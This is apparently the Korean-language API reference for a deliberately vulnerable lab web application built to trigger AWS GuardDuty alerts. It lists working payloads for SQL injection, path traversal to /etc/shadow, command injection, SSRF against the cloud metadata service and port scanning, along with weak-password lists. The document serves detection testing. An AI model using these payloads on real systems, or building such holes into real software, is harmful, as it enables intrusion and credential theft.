# 📚 API 레퍼런스 - 취약한 웹 애플리케이션

## 🎯 API 개요

이 문서는 보안 테스트를 위한 취약한 웹 애플리케이션의 모든 API 엔드포인트를 상세히 설명합니다.

**기본 URL**: `http://your-server:8000`

## 🏥 상태 확인

### GET /health
애플리케이션 상태를 확인합니다.

**응답 예시**:
```json
{
  "상태": "정상",
  "취약점_존재": true
}
```

---

## 👤 사용자 관리 API

### POST /api/v1/users/login
**취약점**: SQL 인젝션

사용자 로그인을 처리합니다.

**요청**:
```json
{
  "username": "admin",
  "password": "password123"
}
```

**SQL 인젝션 페이로드**:
```json
{
  "username": "admin'--",
  "password": "anything"
}
```

**응답**:
```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "user_id": 1
}
```

### POST /api/v1/users/register
**취약점**: SQL 인젝션

새 사용자를 등록합니다.

**요청**:
```json
{
  "username": "newuser",
  "password": "password123",
  "email": "user@example.com"
}
```

**응답**:
```json
{
  "메시지": "사용자가 성공적으로 등록되었습니다"
}
```

### GET /api/v1/users/profile/{user_id}
**취약점**: SQL 인젝션

사용자 프로필 정보를 조회합니다.

**SQL 인젝션 예시**:
```bash
curl "http://localhost:8000/api/v1/users/profile/1' UNION SELECT username,password,email FROM users--"
```

**응답**:
```json
{
  "사용자명": "admin",
  "이메일": "admin@example.com",
  "생성일시": "2024-01-01T00:00:00"
}
```

### GET /api/v1/users/search?q=query
**취약점**: SQL 인젝션

사용자를 검색합니다.

**SQL 인젝션 페이로드**:
```bash
curl "http://localhost:8000/api/v1/users/search?q=' UNION SELECT username,password FROM users--"
```

**응답**:
```json
{
  "사용자_목록": [
    {
      "사용자명": "admin",
      "이메일": "admin@example.com"
    }
  ]
}
```

---

## 👨‍💼 관리자 API (권한 상승)

### GET /api/v1/admin/users?user_id=1
**취약점**: IDOR (Insecure Direct Object Reference)

다른 사용자의 정보에 무단 접근할 수 있습니다.

**요청 예시**:
```bash
# 사용자 ID 1의 정보 접근
curl "http://localhost:8000/api/v1/admin/users?user_id=1"

# 모든 사용자 목록
curl "http://localhost:8000/api/v1/admin/users"
```

**응답**:
```json
{
  "사용자목록": [
    {
      "id": 1,
      "사용자명": "admin",
      "이메일": "admin@example.com",
      "생성일시": "2024-01-01T00:00:00"
    }
  ]
}
```

### POST /api/v1/admin/sudo-command
**취약점**: 약한 비밀번호로 sudo 권한 획득

약한 비밀번호로 관리자 명령어를 실행할 수 있습니다.

**요청**:
```json
{
  "command": "whoami",
  "password": "password123"
}
```

**알려진 약한 비밀번호**:
- `password123`
- `admin`
- `123456`
- `password`
- `root`

**응답**:
```json
{
  "메시지": "sudo 명령어가 실행되었습니다",
  "명령어": "whoami",
  "반환_코드": 0,
  "출력": "ec2-user\n",
  "에러": ""
}
```

### POST /api/v1/admin/change-user-role
**취약점**: 수평적 권한 상승

약한 관리자 키로 다른 사용자를 관리자로 승격시킬 수 있습니다.

**요청**:
```json
{
  "user_id": 2,
  "new_role": "admin",
  "admin_key": "admin123"
}
```

**알려진 약한 관리자 키**:
- `admin123`
- `masterkey`
- `superuser`
- `root123`

**응답**:
```json
{
  "메시지": "사용자 2의 역할이 admin으로 변경되었습니다",
  "사용자_ID": 2,
  "새로운_역할": "admin",
  "권한": ["사용자_관리", "시스템_접근", "DB_접근"]
}
```

### POST /api/v1/admin/create-instance
EC2 인스턴스를 생성합니다 (CloudTrail 이벤트 생성).

**요청**:
```json
{
  "instance_type": "t2.micro"
}
```

---

## 📁 파일 관리 API

### POST /api/v1/files/upload
**GuardDuty**: S3 CloudTrail 이벤트 생성

파일을 S3에 업로드합니다.

**요청**: multipart/form-data
```bash
curl -X POST -F "file=@example.txt" http://localhost:8000/api/v1/files/upload
```

**응답**:
```json
{
  "메시지": "파일이 성공적으로 업로드되었습니다",
  "파일_ID": "123e4567-e89b-12d3-a456-426614174000",
  "파일명": "example.txt",
  "S3_키": "uploads/123e4567-e89b-12d3-a456-426614174000_example.txt"
}
```

### GET /api/v1/files/download?filename=
**취약점**: 디렉토리 탐색

경로 탐색을 통해 시스템 파일에 접근할 수 있습니다.

**디렉토리 탐색 페이로드**:
```bash
curl "http://localhost:8000/api/v1/files/download?filename=../../etc/passwd"
curl "http://localhost:8000/api/v1/files/download?filename=../../../etc/shadow"
```

### POST /api/v1/files/bulk-upload?count=100
**GuardDuty**: 대량 S3 작업

대량의 파일을 S3에 업로드합니다.

**응답**:
```json
{
  "메시지": "100개 파일이 성공적으로 업로드되었습니다",
  "파일목록": ["bulk-upload/file_0_uuid.txt", "..."]
}
```

### DELETE /api/v1/files/cleanup
대량 업로드된 파일들을 정리합니다.

**응답**:
```json
{
  "메시지": "150개 파일이 삭제되었습니다"
}
```

### GET /api/v1/files/list?prefix=
파일 목록을 조회합니다.

**응답**:
```json
{
  "파일목록": [
    {
      "파일명": "uploads/example.txt",
      "크기": 1024,
      "수정일시": "2024-01-01T00:00:00"
    }
  ]
}
```

---

## 💀 익스플로잇 API (테스트용)

### GET /api/v1/exploit/ssrf?url=
**취약점**: 서버 측 요청 위조 (SSRF)
**GuardDuty**: UnauthorizedAPICall:EC2/MaliciousIPCaller

외부 또는 내부 서비스에 요청을 보냅니다.

**SSRF 페이로드**:
```bash
# AWS 메타데이터 서비스 접근
curl "http://localhost:8000/api/v1/exploit/ssrf?url=http://169.254.169.254/latest/meta-data/"

# 내부 서비스 스캔
curl "http://localhost:8000/api/v1/exploit/ssrf?url=http://localhost:22"
```

**응답**:
```json
{
  "URL": "http://httpbin.org/ip",
  "상태_코드": 200,
  "헤더": {"Content-Type": "application/json"},
  "내용": "{\"origin\": \"1.2.3.4\"}"
}
```

### GET /api/v1/exploit/command-injection?cmd=
**취약점**: 명령어 인젝션

시스템 명령어를 실행합니다.

**명령어 인젝션 페이로드**:
```bash
curl "http://localhost:8000/api/v1/exploit/command-injection?cmd=whoami"
curl "http://localhost:8000/api/v1/exploit/command-injection?cmd=ls -la"
curl "http://localhost:8000/api/v1/exploit/command-injection?cmd=cat /etc/passwd"
```

**응답**:
```json
{
  "명령어": "whoami",
  "반환_코드": 0,
  "표준출력": "ec2-user\n",
  "표준에러": ""
}
```

### GET /api/v1/exploit/file-read?filepath=
**취약점**: 임의 파일 읽기

시스템 파일을 읽습니다.

**파일 읽기 페이로드**:
```bash
curl "http://localhost:8000/api/v1/exploit/file-read?filepath=/etc/passwd"
curl "http://localhost:8000/api/v1/exploit/file-read?filepath=/proc/version"
```

**응답**:
```json
{
  "파일경로": "/etc/passwd",
  "내용": "root:x:0:0:root:/root:/bin/bash\n...",
  "크기": 1847
}
```

### POST /api/v1/exploit/port-scan
**GuardDuty**: Recon:EC2/PortProbeUnprotectedPort

대상 호스트의 포트를 스캔합니다.

**요청**:
```bash
curl -X POST "http://localhost:8000/api/v1/exploit/port-scan?target=8.8.8.8&ports=22,80,443,21,23"
```

**응답**:
```json
{
  "대상": "8.8.8.8",
  "스캔된_포트": [22, 80, 443, 21, 23],
  "결과": {
    "22": "closed",
    "80": "closed",
    "443": "open",
    "21": "closed",
    "23": "closed"
  }
}
```

### POST /api/v1/exploit/crypto-mining-sim?duration=60
**GuardDuty**: CryptoCurrency:EC2/BitcoinTool.B

암호화폐 채굴 활동을 시뮬레이션합니다.

**응답**:
```json
{
  "실행시간": 60.0,
  "계산된_해시수": 60892100,
  "초당_해시수": 1014868.3333333334
}
```

### GET /api/v1/exploit/dns-lookup?domain=
의심스러운 도메인을 DNS 조회합니다.

**의심스러운 도메인 페이로드**:
```bash
curl "http://localhost:8000/api/v1/exploit/dns-lookup?domain=botnet.example.com"
curl "http://localhost:8000/api/v1/exploit/dns-lookup?domain=malicious.test.com"
```

**응답**:
```json
{
  "도메인": "botnet.example.com",
  "출력": "Server: 8.8.8.8\nAddress: 8.8.8.8#53\n\n** server can't find botnet.example.com: NXDOMAIN\n",
  "오류": ""
}
```

### GET /api/v1/exploit/metadata-access
**GuardDuty**: UnauthorizedAPICall:EC2/MaliciousIPCaller

AWS 메타데이터 서비스에 접근을 시도합니다.

**응답**:
```json
{
  "메타데이터_결과": {
    "http://169.254.169.254/latest/meta-data/": {
      "status_code": 200,
      "content": "ami-id\nami-launch-index\n..."
    },
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/": {
      "error": "Connection timeout"
    }
  }
}
```

---

## 🗄️ RDS 공격 API

### POST /api/v1/rds/brute-force-attack
**GuardDuty**: RDS 무차별 대입 공격

RDS에 대한 무차별 대입 공격을 시뮬레이션합니다.

**요청**:
```bash
curl -X POST "http://localhost:8000/api/v1/rds/brute-force-attack?target_user=admin&attempts=50"
```

**응답**:
```json
{
  "메시지": "무차별 대입 공격 시뮬레이션 완료",
  "대상_사용자": "admin",
  "총_시도수": 50,
  "실패_시도수": 49,
  "성공_시도수": 1,
  "공격_지속시간": "5.0초"
}
```

### POST /api/v1/rds/sql-injection-mass-query
대량의 SQL 인젝션 공격을 시뮬레이션합니다.

**요청**:
```bash
curl -X POST "http://localhost:8000/api/v1/rds/sql-injection-mass-query?query_count=100"
```

**응답**:
```json
{
  "메시지": "대량 SQL 인젝션 공격 완료",
  "총_쿼리수": 100,
  "실행된_쿼리수": 95,
  "샘플_쿼리": [
    {
      "query_id": 1,
      "payload": "' OR '1'='1",
      "status": "executed",
      "result_count": 3
    }
  ]
}
```

### POST /api/v1/rds/connection-exhaustion
**GuardDuty**: 연결 풀 고갈

RDS 연결 풀을 고갈시키는 공격을 시뮬레이션합니다.

**요청**:
```bash
curl -X POST "http://localhost:8000/api/v1/rds/connection-exhaustion?concurrent_connections=20"
```

**응답**:
```json
{
  "메시지": "연결 고갈 공격이 시작되었습니다",
  "동시_연결수": 20,
  "참고사항": "고갈 시뮬레이션을 위해 연결을 30초 동안 유지합니다"
}
```

### GET /api/v1/rds/rds-performance-impact
리소스 집약적인 쿼리로 RDS 성능에 영향을 줍니다.

**응답**:
```json
{
  "메시지": "RDS 성능 영향 시뮬레이션 완료",
  "실행된_쿼리": [
    {
      "query_id": 1,
      "execution_time": "2.34 seconds",
      "result_count": 9,
      "query": "SELECT COUNT(*) FROM users u1 CROSS JOIN users u2 CROSS JOIN users u3"
    }
  ],
  "총_실행시간": 12.56
}
```

### POST /api/v1/rds/create-rds-instance
취약한 설정으로 RDS 인스턴스를 생성합니다.

**요청**:
```bash
curl -X POST "http://localhost:8000/api/v1/rds/create-rds-instance?instance_class=db.t3.micro&publicly_accessible=true"
```

**응답**:
```json
{
  "메시지": "취약한 RDS 인스턴스 생성이 시작되었습니다",
  "인스턴스_식별자": "vulnerable-db-1640995200",
  "인스턴스_클래스": "db.t3.micro",
  "공개_접근_가능": true,
  "보안_문제점": [
    "공개 접근 가능",
    "약한 비밀번호",
    "암호화 없음",
    "백업 없음",
    "삭제 보호 없음"
  ]
}
```

---

## 📊 응답 코드

### 성공 응답
- `200 OK`: 요청 성공
- `201 Created`: 리소스 생성 성공

### 클라이언트 오류
- `400 Bad Request`: 잘못된 요청
- `401 Unauthorized`: 인증 필요
- `403 Forbidden`: 접근 권한 없음
- `404 Not Found`: 리소스를 찾을 수 없음
- `408 Request Timeout`: 요청 시간 초과

### 서버 오류
- `500 Internal Server Error`: 서버 내부 오류

## 🔒 보안 로그 레벨

### CRITICAL
- 권한 상승 시도
- 시스템 파일 접근
- AWS 메타데이터 접근
- 암호화폐 채굴 활동

### WARNING  
- SQL 인젝션 시도
- SSRF 공격
- 포트 스캔 활동
- 의심스러운 파일 접근

### INFO
- 정상적인 API 호출
- 파일 업로드/다운로드
- 사용자 등록/로그인

## 🧪 테스트 시나리오

### 1. 기본 취약점 테스트
```bash
# SQL 인젝션
curl "http://localhost:8000/api/v1/users/search?q=' OR 1=1--"

# SSRF
curl "http://localhost:8000/api/v1/exploit/ssrf?url=http://httpbin.org/ip"

# 명령어 인젝션
curl "http://localhost:8000/api/v1/exploit/command-injection?cmd=id"
```

### 2. 권한 상승 테스트
```bash
# IDOR
curl "http://localhost:8000/api/v1/admin/users?user_id=1"

# sudo 권한 획득
curl -X POST "http://localhost:8000/api/v1/admin/sudo-command" \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami", "password": "password123"}'
```

### 3. GuardDuty 탐지 테스트
```bash
# 암호화폐 채굴
curl -X POST "http://localhost:8000/api/v1/exploit/crypto-mining-sim?duration=30"

# 메타데이터 접근
curl "http://localhost:8000/api/v1/exploit/metadata-access"

# 포트 스캔
curl -X POST "http://localhost:8000/api/v1/exploit/port-scan?target=scanme.nmap.org&ports=22,80,443"
```

---

**주의**: 이 API들은 보안 테스트 목적으로만 설계되었습니다. 실제 공격에 사용하지 마세요!